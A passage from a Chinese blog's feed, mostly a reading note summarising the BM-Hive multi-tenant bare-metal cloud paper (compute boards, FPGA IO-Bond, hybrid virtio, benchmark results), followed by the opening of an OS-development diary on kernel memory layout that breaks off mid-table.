    <content type="html"><![CDATA[<p>出走字节 IaaS 开发实习两年，归来读安全 PhD 依然在做 DPU</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近不知道为什么又开始看 DPU 了（反正就是啥都想弄一点），所以先从这篇非常经典的论文入手：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>虚拟化技术是 IaaS 的基石，虽然多租户共享同一物理机提高了数据中心服务器的利用率，但带来对安全问题的忧虑（尤其是侧信道攻击），且增加了资源开销；新兴的裸金属云提供了强隔离性与对硬件的完全访问，但只能将整台物理服务器租给用户，无法在出租后对用户程序控制，且扩展性差、成本效率低</p><p>本文提出一种新的高密度、多租户裸金属云设计：<code>BM-Hive</code> ，每个裸金属客户运行在各自的计算板上——带有专有 CPU 与内存的 PCIe 扩展板，其软硬件混合 virtio I&#x2F;O 系统允许客户直接访问云网络与存储设备；<code>BM-Hive</code> 可以显著提升裸金属服务的成本效益，从硬件层分隔裸金属用户以提供更好的安全与隔离；<code>BM-Hive</code> 被作者部署在最大的公有云基础设施之一上，为数万用户同时服务</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>虚拟化技术是公有 IaaS 云的基石，EPT 这样的高级虚拟化技术显著提升了 VM 性能，但多租户共享同一物理机带来对安全与性能的忧虑，尤其是针对 CPU 缓存与超线程等紧密结合的资源的侧信道攻击，此外共享资源冲突可以带来不可预估的性能波动</p><p><strong>Limitations of existing approach</strong> ：为了解决这些问题，租户独占物理机的裸金属服务出现了（称为单租户裸金属服务器，因为只能整个租出），但其仍有一些成本效益、性能、互通性上的限制：</p><ul><li><strong>Cost</strong> ：单租户裸金属服务器只能整个租出，但用户不一定需要这么多性能</li><li><strong>Single-thread performance</strong> ：绝大多数云服务器使用核数多但单核弱的 Xeon ，裸金属服务的用户通常需要更高性能</li><li><strong>Interoperability and manageability</strong> ：裸金属服务必须无缝结合到现有云系统中以从弹性云架构中受益，然而单租户裸金属服务与现有的基于 VM 的云不同，其通常由 Intel Management Engine 类已知不安全系统管理，且裸金属服务应当与 VM 镜像兼容以复用镜像</li></ul><p><strong>Our approach</strong> ：本文给出 <code>BM-Hive</code> 的设计：一个可以解决所有这些挑战的可扩展的多租户裸金属服务，其由三部分组成：一个裸金属 hypervisor （ <code>bm-hypervisor</code> ，对应传统的 <code>vm-hypervisor</code> ）、一组裸金属客户（ <code>bm-guest</code> ，对应传统的 <code>vm-guest</code>）、一个 IO 枢纽（<code>IO-Bond</code>）； <code>bm-hypervisor</code> 运行在服务器主 CPU 上管理所有 guests 的生命周期并作为 <code>IO-Bond</code> 后端，但不似 <code>vm-hypervisor</code> 那样要虚拟化 CPU 或内存，而是每个 <code>bm-guest</code> 都运行在各自的计算板上（由专有处理器、内存单元、PCIe 接口组成）； <code>IO-Bond</code> 作为硬件的一部分由 FPGA 进行实现以用于在主板与计算板间通信，其一方面模拟 I&#x2F;O 设备（例如 virtio 网络与块设备），另一方面将计算板与主板的 PCIe 总线连接并转发  <code>bm-guest</code> 的 I&#x2F;O 请求到  <code>bm-hypervisor</code> </p><p> <code>BM-Hive</code> 的设计充分解决了单租户裸金属服务的限制， <strong>首先</strong> ， <code>BM-Hive</code> 可以在一个  <code>BM-Hive</code> 服务器上支持 16 个 <code>bm-guest</code> ，提升服务密度的同时降低开销， <strong>其次</strong> ，<code>bm-guest</code> 可以使用任何计算板所支持的 CPU, <strong>最后</strong> ， <code>BM-Hive</code> 可以无缝融合到现有云基础架构中；最主要的区别是 <code>vm-guest</code> 运行在虚拟 CPU 上，而 <code>bm-guest</code> 运行在计算板上，而这对云基础架构而言是无感知的（归功于 <code>bm-hypervisor</code> 与 <code>IO-Bond</code> ），表 1 对比了三种类型云服务的不同层；此外 <code>bm-guest</code> 无法完全控制整个服务器， <code>bm-hypervisor</code> 通过 PCIe 接口控制其执行，且 <code>IO-Bond</code> 在硬件中强制对 <code>bm-guest</code> 进行适当隔离</p><p><img src="https://s2.loli.net/2024/07/25/xhGA7yFgsMUo1c4.png" alt="Table 1. Comparison of three cloud services"></p><p>作者在最大的 IaaS 公有云数据中心之一部署了 <code>BM-Hive</code> ，并彻底分析了其安全性与性能表现，其实验展示了 <code>BM-Hive</code> 的强隔离、安全与性能</p><p>总而言之，本文贡献如下：</p><ul><li>作者提出来新的裸金属云设计，结合了现有基于 VM 的与单租户裸金属的服务器的优点，并提供安全、灵活、可操作的裸金属云服务</li><li><code>BM-Hive</code> 有软硬件结合的 virtio 系统，让 guests 可以直接与现有云基础架构结合，直接获得云服务的可用性与弹性</li><li>作者基于 <code>BM-Hive</code> 的设计构建了一个产品级的系统并在真实的云中部署，证明了 <code>BM-Hive</code> 的可行性</li><li>作者在最大的公有云基础设施之一部署了 <code>BM-Hive</code> 并充分测量其性能，证明了其相对基于 VM 的云服务的优点</li></ul><h1 id="0x02-Background-and-Motivation"><a href="#0x02-Background-and-Motivation" class="headerlink" title="0x02. Background and Motivation"></a>0x02. Background and Motivation</h1><p><strong>Background</strong> ：虚拟化是传统云的关键技术，主要有 CPU、内存、I&#x2F;O 三个层面，CPU 与 内存虚拟化由处理器提供，云上 I&#x2F;O 则通常是半虚拟化，Guest侧内核直接请求与处理高级 I&#x2F;O 操作，而非模拟低级 I&#x2F;O 操作（如寄存器访问），或是直接硬件设备直通</p><h2 id="2-1-Impact-on-Performance"><a href="#2-1-Impact-on-Performance" class="headerlink" title="2.1 Impact on Performance"></a>2.1 Impact on Performance</h2><p><strong>Performance overhead</strong> ：许多事件都能产生 VM exits 而造成大量开销（单个 exit 事件至少 10 µs 的情况下，每秒 5000+ 次 VM exit 将是不可忽视的开销），表 2 展示了在作者的云数据中心上 5 min 内的 300000 个 VM 的统计情况</p><p><img src="https://s2.loli.net/2024/07/25/yPx3XfA87FgMTdZ.png" alt="Table 2. Number of VM exits per second per vCPU"></p><p>即便是 Guest 直接访问硬件的设备直通也会有开销，基于 IOMMU 的实现可以增加 60% 的网卡在 CPU 上使用（但吞吐量不变）</p><p>此外还有其他会增加性能开销的层面（如 vCPU 锁、TLB等），但这些在 <code>BM-Hive</code> 服务器中都没有</p><p><strong>Performance variation</strong> ：共享资源的冲突同样带来性能影响，如 I&#x2F;O 处理高峰期 host OS 可能抢占 guest VM 执行而造成性能开销与波动</p><p>图 1 展示了作者的数据中心在 24 小时内的 20000 VM 由低到高的被 hypervisor 抢占率（shared 表示未与物理核心绑定），需要注意的是这种情况下没有 VM 主动尝试占有资源（否则会更糟）</p><p><img src="https://s2.loli.net/2024/07/25/Oe3Li9aIoykAs7Z.png" alt="Figure 1. VM preemption of the 99th and 99.9th percentile. The y-axis shows the percent of the CPU time used by the hypervisor/the host OS."></p><h2 id="2-2-Security-Concerns"><a href="#2-2-Security-Concerns" class="headerlink" title="2.2 Security Concerns"></a>2.2 Security Concerns</h2><p>VM 间硬件资源共享可能导致侧信道攻击（如 Meltdown、Spectre、L1TF 等），但在 <code>bm-guest</code> 物理隔离的 <code>BM-Hive</code> 上不存在这个问题</p><p>hypervisor 漏洞是云上主要攻击面，但 <code>bm-hypervisor</code> 无需 CPU&#x2F;内存 虚拟化且不能从 guests 侧直接访问</p><blockquote><p>笔者注：这一块实际上笔者感觉不是很彳亍，因为模拟设备在 DPU 上模拟（通常由 QEMU 实现）同样会有漏洞，对于攻击者而言似乎只是攻击的位置变了</p></blockquote><h2 id="2-3-Nested-Hypervisor"><a href="#2-3-Nested-Hypervisor" class="headerlink" title="2.3 Nested Hypervisor"></a>2.3 Nested Hypervisor</h2><p>传统云用户想要再跑虚拟机只能依赖嵌套虚拟化，这增大了 hypervisor 设计复杂度与性能开销</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="3-1-Design-Requirements"><a href="#3-1-Design-Requirements" class="headerlink" title="3.1 Design Requirements"></a>3.1 Design Requirements</h2><p><code>BM-Hive</code> 设计要求如下：</p><ul><li><p><strong>Multi-tenancy</strong> ： <code>BM-Hive</code> 必须支持多租户共享同一物理服务器以实现细粒度 CPU 核心</p></li><li><p><strong>Security</strong> ： <code>BM-Hive</code> 必须提供基于硬件的 <code>bm-guests</code> 间强隔离</p></li><li><p><strong>Interoperability</strong> ：  <code>BM-Hive</code> 必须与现有云基础架构兼容以获取已有的可用性、依赖性、弹性，互通性（interoperability）要求 <code>bm-guest</code> 同样能运行在 VM 中，这个特性称为 <code>cold migration</code> ，其一个依赖项便是 <code>bm-guest</code> 必须能够与云存储与网络进行高性能连接（由 virtio 这样的半虚拟化支持）， <code>BM-Hive</code> 通过特制的软硬件混合 virtio 实现</p></li><li><p><strong>Performance</strong> ： <code>bm-guest</code> 应当有原生 CPU&#x2F;内存性能与近原生 IO 性能以及最小的性能波动</p></li><li><p><strong>Cost efficiency</strong> ：<code>bm-guest </code>在同配置下 开销应比 <code>vm-guest</code> 小</p></li></ul><h2 id="3-2-System-Overview"><a href="#3-2-System-Overview" class="headerlink" title="3.2 System Overview"></a>3.2 System Overview</h2><p>图 2 对比了虚拟化架构与 <code>BM-Hive</code> 的区别，主要区别是 <code>vm-guest</code> 运行在虚拟化 CPU 与内存上而 <code>bm-guest</code> 运行在物理 CPU 与内存上，<code>bm-hypervisor</code> 是类似 <code>vm-hypervisor</code> 的用户态程序，管理 <code>vm-guest</code> 生命周期、提供 virtio 设备、与云基础架构交互等，其不需要虚拟化因而代码比 <code>vm-hypervisor</code> 简单得多，<code>bm-hypervisor</code> 进程与 <code>bm-guest</code> 间一一对应且只能通过 virtio 交互</p><p><img src="https://s2.loli.net/2024/07/25/ACfzumlg1c6UDhI.png" alt="Figure 2. Architecture of BM-Hive, compared to KVM"></p><p><strong>Use scenario</strong> ：云基础架构选择一个可用的裸金属服务器并选择一个空闲计算卡启动（通过开启 PCIe power），板上固件开始执行 boot loader 并随后加载 <code>bm-guest</code> 内核，云上绝大部分 guests 无法使用本地存储，因此 bootloader 与内核通过 virtio-blk 获取，作者通过扩展 EFI 固件以实现这一点</p><h2 id="3-3-System-Architecture"><a href="#3-3-System-Architecture" class="headerlink" title="3.3 System Architecture"></a>3.3 System Architecture</h2><p>图 3 展示了 <code>BM-Hive</code> 的系统架构，每个裸金属服务器由简化的 Xeon 服务器（<code>base</code> ）与一组计算卡（由 CPU、内存、PCIe 总线、FPGA 构建的 IO-Bond 组成的 PCIe 卡）组成，在 <code>bm-guest</code> 视角由计算卡模拟的 virtio 设备是常规的 PCIe 设备，IO-Bond 作为 <code>bm-guest</code> 中的 virtio 前端与 <code>bm-hypervisor</code> 中的 virtio 后端间的桥梁，并通过内置的 DMA 引擎进行命令与数据的转发；IO-Bond 目前支持 virtio 网络与存储设备，且可以轻易扩展，此外其可以由 ASIC 芯片实现</p><p><img src="https://s2.loli.net/2024/07/25/bEaomMIZGgAkjX8.png" alt="Figure 3. System architecture of BM-Hive"></p><p>在 <code>bm-hypervisor</code> 的角度每个计算卡便是一个 PCIe 的 <code>bm-guest</code> 设备，一个 <code>base</code> 服务器可以支撑 16 张计算卡，<code>bm-hypervisor</code> 的功能主要有：1️⃣ 管理 <code>bm-guest</code> 生命周期与计算卡分配 2️⃣ 提供并维护 virtio 设备后端 3️⃣ 与现有云基础架构对接</p><h2 id="3-4-IO-Bond"><a href="#3-4-IO-Bond" class="headerlink" title="3.4 IO-Bond"></a>3.4 IO-Bond</h2><p>IO-Bond 用于充当计算卡上 virtio 设备的代理</p><p><strong>3.4.1 IO-Bond: Frontend.</strong>  IO-Bond 前端连接到计算板的 PCIe 总线，其 FPGA 模拟了 PCI 接口供 <code>bm-guest</code> 使用，并将 <code>bm-guest</code> 访问转发到后端</p><p><code>BM-Hive</code> 无法直接使用虚拟化系统的共享环缓冲区设计（IO-Bond 前后端物理内存不共享），因此由 IO-Bond 为 <code>bm-hypervisor</code> 与 <code>bm-guest</code> 提供环缓冲区，并将 <code>bm-hypervisor</code> 的环缓冲区与其他进行同步（如图 4 所示），在一个缓冲区被添加上数据后 IO-Bond 的 DMA 引擎便会拷贝到其他缓冲区</p><p><img src="https://s2.loli.net/2024/07/25/MNbjS7ifZ1ETYF3.png" alt="Figure 4. Shadow ring buffers in BM-Hive"></p><p><strong>3.4.2 IO-Bond: Backend.</strong> IO-Bond 后端将请求转发到对应云设备，其设计主要关注与云基础架构间的高性能 I&#x2F;O，在 <code>BM-Hive</code> 中所有 I&#x2F;O 请求通过 vhost-user 协议与云基础架构（修改版 DPDK vSwitch 和 SPDK 云存储，使用 poll mode driver 而非中断）交互，由此所有请求在用户空间完成处理，避免额外的内核与用户态间内存拷贝；此外 <code>BM-Hive</code> 支持 VGA 设备以连接 <code>bm-guest</code> 控制台</p><p><img src="https://s2.loli.net/2024/07/25/BR9A5OYKZgHCSUj.png" alt="Figure 5. Backend of BM-Hive"></p><p><strong>3.4.3 IO-Bond Implementation.</strong> 每个 virtio 设备的每个 virtio 队列都有一个对应的后端 shadow vring（IO-Bond 与 <code>bm-hypervisor</code> 间的共享缓冲区，所有 shadow vring 被组织为一个缓冲区描述符列表并映射到 IO-Bond 中）， <code>bm-hypervisor</code> 与 IO-Bond 间通过一对 mailbox 寄存器传递 PCI 访问提醒，且每个 shadow vring 都有一对 head&#x2F;tail 寄存器</p><p>图 6 展示了 IO-Bond 如何响应 guests 的一个传统的 virtio Tx&#x2F;Rx 工作流，<code>bm-guest</code> 写入 virtio 寄存器以通知 IO-Bond 、并在 Rx 数据到达时获得 MSI 中断；<code>bm-hypervisor</code> 中有一个专有线程拉取 IO mailbox 与 shadow vring head&#x2F;tail 寄存器以避免中断，图中 1 ～ 6 为标准 virtio 操作；最终 IO-Bond 通过更新 head 寄存器通知 <code>bm-hypervisor</code> ，收到的 Rx 缓冲区被保留</p><p><img src="https://s2.loli.net/2024/07/25/QYZm57sTAGkjb1x.png" alt="Figure 6. Tx/Rx example of IO-Bond"></p><p>得益于 IO-Bond 中 FPGA 的低开销，<code>bm-guest</code> 到 IO-Bond 的 PCI 读写操作仅需要 0.8 µs，IO-Bond 到 mailbox 寄存器又要 0.8 µs，单次访问总开销仅 1.6 µs；IO-Bond 为每个 virtio 网络&#x2F;存储设备暴露一个 PCIe x4 接口，通过 PCIe x8 接口备份到 <code>bm-hypervisor</code> ，IO-Bond 内部 DMA 吞吐量为 50Gbps（每个 x4 接口为 32 Gbps），通过服务器共享网络接口（100 Gbps） 转发到云服务，且 <code>bm-guest</code> 间贷款消耗会动态平衡以保持公平</p><h2 id="3-5-Costs-efficiency"><a href="#3-5-Costs-efficiency" class="headerlink" title="3.5 Costs efficiency"></a>3.5 Costs efficiency</h2><p>数据中心的盈利能力取决于 vCPU 密度，传统的基于 VM 的服务器需要为 hypervisor 与 host OS 保留 CPU 核心，而 <code>BM-Hive</code> 具有更高的 vCPU 成本效益（虽然需要额外的 CPU 与 FPGA 支出）</p><p>能耗也是成本效率的一个点，但 <code>BM-Hive</code> 与传统 VM 服务器提供的 vCPU 不同，因此很难比较</p><h1 id="0x04-Evaluation"><a href="#0x04-Evaluation" class="headerlink" title="0x04. Evaluation"></a>0x04. Evaluation</h1><h2 id="4-1-Environment-Setup"><a href="#4-1-Environment-Setup" class="headerlink" title="4.1 Environment Setup"></a>4.1 Environment Setup</h2><p>表 3 展示了作者部署 <code>BM-Hive</code> 的公有云上的实例配置，注意一个云实例的 I&#x2F;O 性能通常被限速以预防资源误用和提升整体服务质量</p><p><img src="https://s2.loli.net/2024/07/26/kXH73A6xrRhWcwI.png" alt="Table 3. Bare-metal instances available in our cloud. The last column shows the maximum number of the compute boards in a single BM-Hive server. This number depends on the server’s power supply, internal space, and I/O performance."></p><h2 id="4-2-CPU-and-Memory-Performance"><a href="#4-2-CPU-and-Memory-Performance" class="headerlink" title="4.2 CPU and Memory Performance"></a>4.2 CPU and Memory Performance</h2><p>所有实验在带有相同的基于 CentOS 的系统的 Xeon E5-2682 v4 实例上完成，作者对比了 <code>BM-Hive</code> 与 VM 以及物理机（可行时）的性能，<code>vm-guest</code> 与 <code>bm-guest</code> 都运行在 64G 内存的 Xeon E5-2682 v4 CPU 上，<code>vm-guest</code> 独占实例且固定到有 NMUA 节点亲和力的物理 CPU 核心上</p><p>作者将 <code>BM-Hive</code> 与 <code>vm-guest</code> 与物理机器的性能进行比较，内核版本为 <code>3.10.0-514.26.2.el7</code> ，但物理机有 2 个 CPU 插槽与 384G 内存，图 7 与 8 展示了 SPEC CINT 2006 与 STREAM 的多次测试结果</p><p><img src="https://s2.loli.net/2024/07/26/zp1CjeF8Tn2BvNK.png" alt="Figure 7. CPU performance by SPEC CPU2006 Figure 8. Memory bandwidth by STREAM multi-thread"></p><p>CPU 的测试结果相近，<code>BM-Hive</code> 比物理机快 4%，VM 比物理机慢 4% ，注意到 <code>bm-guest</code> 与物理机性能并不完全相同（因为配置与设计不同）， <code>vm-guest</code> 则因为虚拟化的缘故存在开销</p><p><code>BM-HIve</code> 在内存上同样占优，如图 8 所示<code>BM-HIve</code> 几乎与物理机完全相同，但 <code>vm-guest</code> 由于虚拟化开销最多只有 <code>bm-guest</code> 98% 的性能</p><p><strong>Summary</strong> ：同配置 <code>bm-guest</code>比  <code>vm-guest</code> 有更好的 CPU 与内存性能，且 <code>BM-HIve</code> 可以利用单线程性能更高的 CPU</p><h2 id="4-3-I-O-Performance"><a href="#4-3-I-O-Performance" class="headerlink" title="4.3 I&#x2F;O Performance"></a>4.3 I&#x2F;O Performance</h2><p><code>bm-guest</code> 与 <code>vm-guest</code> 有着近乎一样的基于 virtio 的 IO 路径，但 <code>BM-Hive</code> 有着软硬件结合的设计，本节我们对比同一云网络与存储下的性能，guests 网速被限制在 4M PPS 与 10Gbps 的带宽，存储被限制在 25 IOPS 与 300 MBps 的带宽</p><p><strong>Network performance</strong> ：作者使用 <code>netperf-2.5</code> 在两个 <code>bm-guest</code> 间收发 UDP 包（并添加 <code>vm-guest</code> 对照组），结果如图 9 所示， <code>bm-guest</code> 与 <code>vm-guest</code> 都达到了 3.2M PPS，由于 <code>BM-Hive</code> 的 I&#x2F;O 路径更长所以 <code>vm-guest</code> 有着更少的抖动</p><p><img src="https://s2.loli.net/2024/07/26/J9iERPS8zLXpCdU.png" alt="Figure 9. UDP packet receive rate"></p><p>作者使用不同的工具对比了 <code>bm-guest</code> 与 <code>vm-guest</code> 的延迟以测算 IO-Bond 开销，图 10 显示了使用 <code>sockperf-3.5</code> 测试 UDP 的结果（并使用 DPDK 绕过内核），由于 <code>BM-Hive</code> 的 I&#x2F;O 路径更长所以 <code>vm-guest</code> 结果更好（在 ICMP 上也是）</p><p><img src="https://s2.loli.net/2024/07/26/7TVJfov5DQeHd8n.png" alt="Figure 10. UDP and ping latency"></p><p>吞吐量也是网络性能的重点，作者使用 <code>netperf-2.5</code> 测试 64  个单个数据包为 1400B 的 TCP 连接，<code>bm-guest</code> 为 9.6 Gbps， <code>vm-guest</code> 为 9.59 Gbps</p><p>总之，<code>BM-Hive</code> 性能满足设计目的，此外作者通过取消 PPS 限制来测量其最大网络性能（可以达到 16M PPS）</p><p><strong>Storage performance</strong> ：作者通过100Gbps 网络访问 SSD 云存储运行 fio benchmark 使用 8 线程进行 4KB 随机读写， <code>bm-guest</code> 与 <code>vm-guest</code> 都是饱和存储速率，但如图 11 所示 <code>bm-guest</code> 有更低的平均延迟与 99.9% 延迟</p><p><img src="https://s2.loli.net/2024/07/26/BKcsrvJhi26TnO8.png" alt="Figure 11. Storage I/O latency"></p><p>作者还测试了无限制的访问本地 SSD 的存储性能， <code>BM-Hive</code> 在 IOPS 上比 VM 快 50%，在带宽上快 100%，平均延迟仅为 60µs</p><p>总之，<code>BM-Hive</code> 的存储性能得益于 IO-Bond 的 DMA 引擎而比需要额外内存拷贝的 VM 更好</p><p><strong>Summary</strong> ：<code>bm-guest</code> 与 <code>vm-guest</code> 都能达到基于云的网络与存储 IO 限制，但 <code>bm-guest</code> 在更坏情况（99.9 percentile）下更好，在无限制下比 <code>vm-guest</code> 性能显著提高</p><h2 id="4-4-Application-Performance"><a href="#4-4-Application-Performance" class="headerlink" title="4.4 Application Performance"></a>4.4 Application Performance</h2><p>一个重要的实验是 <code>BM-Hive</code> 执行云上常用应用的性能，测试结果如图 12、13、14 所示</p><blockquote><p>详细的实验数据就不抄了，自己去看原文（笑）</p></blockquote><p><img src="https://s2.loli.net/2024/07/26/T4Pt6phkYzZOb2x.png" alt="Figure 12. NGINX Figure 13. MariaDB ready-only Figure 14. MariaDB rd/wr and wr-only Figure 15. Redis with varying clients Figure 16. Redis with varying data size"></p><p><strong>Summary</strong> ： <code>BM-Hive</code> 运行流行云上应用的性能比基于虚拟化的云服务更好</p><h1 id="0x05-Related-Work"><a href="#0x05-Related-Work" class="headerlink" title="0x05. Related Work"></a>0x05. Related Work</h1><p><strong>Reducing world switches</strong> ：虚拟化的主要开销之一便是 guest 与 hypervisor 间的切换，有一部分工作便关注于减少切换，例如形如网卡的高速驱动会产生大量中断，<a href="https://dl.acm.org/doi/pdf/10.1145/2248487.2151020">ELI</a> （Exit-Less Interrupt）致力于将 hypervisor 从中断路径上移除从而让 Guest 直接处理中断以提高吞吐量并减少延迟；此外在 guest 侧也有优化空间，如 KVM 最近引入的 <code>halt_polling</code> 特性在让 CPU 休眠前拉取唤醒请求以避免 guest 在休眠后又立即被等待中的唤醒请求唤醒；但 <code>BM-Hive</code> 不会有这些问题</p><p><strong>Memory virtualization</strong> ：内存通常被虚拟化为两级页表：GVA➡️GPA➡️HPA，因此现有工作之一便是减少开销极大的 TLB miss ，如增大 TLB 覆盖率（例如使用大页）或减少 TLB 惩罚，如 <a href="https://dl.acm.org/doi/10.1145/3140659.3080210">POM-TLB</a> 便是将内存的一部分作为 TLB 以增大 TLB，或是<a href="https://www.usenix.org/conference/atc17/technical-sessions/presentation/amit">跟踪页访问以维护 TLB 而减少 TLB miss</a>；但 <code>BM-Hive</code> 不会有这些问题</p><p><strong>Device virtualization</strong> ：现有虚拟设备大都通过半虚拟化实现，最流行的便是 virtio ，此外如 SR-IOV 网卡等也支持原生虚拟化；特别地，<code>BM-Hive</code> 通过混合方式实现了 virtio 以与现有云基础架构交互</p><p><strong>Minimal hypervisor</strong> ：也有一些工作关注于创建最小的 hypervisor ，如 Intel 的 ACRN 便是用于嵌入式 IOT 设备的小型 hypervisor （ <del>笔者注：嵌入式设备还要跑 VM？</del> ）；<code>BM-Hive</code> 比传统的 hypervisor 都简单，因为其并不虚拟化任何东西，也不直接与 <code>bm-guest</code> 交互</p><p><strong>Nest hypervisor</strong> ：<code>BM-Hive</code> 目标之一便是让用户能运行自己的虚拟机，在传统架构上嵌套虚拟化可以实现但开销较大，<code>BM-Hive</code> 的用户直接运行在物理 CPU 上因而有着完全的硬件虚拟化支持</p><p><strong>Other bare-metal services</strong> ：绝大部分公有云都部署了单租户裸金属服务，限制如第 1 节所示；部分公有云也为 VM 部署了特殊的网络设备，例如 Azure 也有智能网卡，但据作者所知其更关注底层云基础架构的优化，而 <code>BM-Hive</code> 并不接触云基础架构层</p><p>也有部分系统有着相似的整体架构，如 Intel 的 VCA2 便是一个带有三个 Xeon E3 v1258L 处理器的 PCIe 卡，但 <code>BM-Hive</code>  是为了云服务而生的</p><h1 id="0x06-Discussion"><a href="#0x06-Discussion" class="headerlink" title="0x06. Discussion"></a>0x06. Discussion</h1><p>本节讨论 <code>BM-Hive</code> 的潜在提升与未来研究计划</p><p><strong>Improvements to IO-Bond</strong> ： IO-Bond 的设计可以进行优化（例如将包处理从 <code>bm-hypervisor</code> 卸载到 IO-Bond 上），除了使用 FPGA 以外也可以使用 ASIC 实现</p><p><strong>Live Migration and Upgrade</strong> ：虚拟机动态迁移非常重要，<a href="https://dl.acm.org/doi/10.1145/3297858.3304034">Orthus</a> 被用于在不停止虚拟机的情况下动态升级 VMM，<code>BM-Hive</code> 的设计使其可以直接应用 Orthus 的方案升级 VMM，但 <code>bm-guest</code> 的迁移则更有挑战，目前的方案是插入一个虚拟化曾并将其转换为 <code>vm-guest</code> ，但仍存在优化空间</p><p><strong>SGX Support</strong> ：SGX 是一个可信执行环境，但目前的虚拟机不好使用这个东西，作者计划在未来为 <code>BM-Hive</code> 添加原生 SGX 支持</p><h1 id="0x07-Summary"><a href="#0x07-Summary" class="headerlink" title="0x07. Summary"></a>0x07. Summary</h1><p>作者设计了 <code>BM-Hive</code> 并进行了评估，很好很强大🎇🎆🎇</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;出走字节 IaaS 开发实习两年，归来读安全 PhD 依然在做 DPU&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="系统虚拟化" scheme="https://arttnba3.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="云计算" scheme="https://arttnba3.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    <category term="DPU" scheme="https://arttnba3.github.io/tags/DPU/"/>
    
    <category term="裸金属" scheme="https://arttnba3.github.io/tags/%E8%A3%B8%E9%87%91%E5%B1%9E/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x04】现代 64 位 OS 开发手记 II：内核内存分配器与 C++ 的初步引入</title>
    <link href="https://arttnba3.github.io/2024/06/30/CODE-0X04-OSDEV64-II_MEMORY-MANAGE/"/>
    <id>https://arttnba3.github.io/2024/06/30/CODE-0X04-OSDEV64-II_MEMORY-MANAGE/</id>
    <published>2024-06-30T13:39:41.000Z</published>
    <updated>2024-07-02T07:55:12.345Z</updated>
    
    <content type="html"><![CDATA[<p>Good old MEMORIES has gone…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>不知不觉这个系列的文章居然已经鸽了大半年了…虽然说已经拖了这么久没有继续进行下一步的代码编写，不过笔者目前暂时并没有放弃这个项目，只是确实不像本科那样能有大段大段的空闲时间去抛开一切去做自己想做的事情了：）</p><p>言归正传，这一次我们将要脱离引导阶段，进入到位于高地址的真正的内核，并建立内存管理系统，笔者选择优先实现内存管理的原因是因为这是一个非常核心的模块，操作系统内核的各个部分几乎都无时无刻不在进行动态内存分配与释放，因此完成了这个模块的开发之后我们后续的工作也能变得更加方便</p><p>本项目代码开源在 <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><blockquote><p>注： <strong>本章暂时省略了常规的内核输出语句</strong> （如类似 <code>printk()</code> 的东西），我们将在下一章完成图形与串口驱动初始化后再重新引入这部分功能，如若你需要查看调试信息，则可以 <em>临时重新引入</em> boot 阶段的输出模块</p></blockquote><h2 id="内核内存布局设定与链接脚本调整"><a href="#内核内存布局设定与链接脚本调整" class="headerlink" title="内核内存布局设定与链接脚本调整"></a>内核内存布局设定与链接脚本调整</h2><p>目前我们暂定的内核内存布局如下所示，笔者在设计时尽量使各个区域都对齐到一个四级页表条目 （512 GB），从而使得我们在后续创建进程时无需重复拷贝过多的内核页表项，而可以尽量进行复用：</p><table><thead><tr><th align="center">Start address</th><th align="center">End address</th><th align="center">Size</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">0x0000000000000000</td><td align="center">0x00007FFFFFFFFFFF</td><td align="center">128TB</td><td align="center">memory space for user-mode process, isolate for per one</td></tr><tr><td align="center">0x0000800000000000</td><td align="center">0xFFFF7FFFFFFFFFFF</td><td align="center">16776960 TB</td><td align="center">unused hole</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">shared kernel-space virtual memory for all processes</td></tr><tr><td align="center">0xFFFF800000000000</td><td align="center">0xFFFFBFFFFFFFFFFF</td><td align="center">64TB</td><td align="center">direct mapping of first 64TB physical memory (physmem_base)</td></tr><tr><td align="center">0xFFFFC00000000000</td><td align="center">0xFFFFCFFFFFFFFFFF</td><td align="center">16TB</td><td align="center">dynamic kernel memory mapping region (vmremap_base)</td></tr><tr><td align="center">0xFFFFD00000000000</td><td align="center">0xFFFFEFFFFFFFFFFF</td><td align="center">32TB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFF00000000000</td><td align="center">0xFFFFF7FFFFFFFFFF</td><td align="center">8TB</td><td align="center">page database (pgdb_base)</td></tr><tr><td align="center">0xFFFFF80000000000</td><td align="center">0xFFFFF9FFFFFFFFFF</td><td align="center">2TB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFFA0000000000</td><td align="center">0xFFFFFA0FFFFFFFFF</td><td align="center">64GB</td><td align="center">kernel stack, isolate for each process</td></tr><tr><td align="center">0xFFFFFA1000000000</td><td align="center">0xFFFFFF7FFFFFFFFF</td><td align="center">5568GB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFFF8000000000</td><td align="center">0xFFFFFF800FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .text segment</td></tr><tr><td align="center">0xFFFFFF8010000000</td><td align="center">0xFFFFFF801FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .data segment</td></tr><tr><td align="center">0xFFFFFF8020000000</td><td align="center">0xFFFFFF802FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .rodata segment</td></tr><tr><td align="center">0xFFFFFF8030000000</td><td align="center">0xFFFFFF803FFFFFFF</td><td 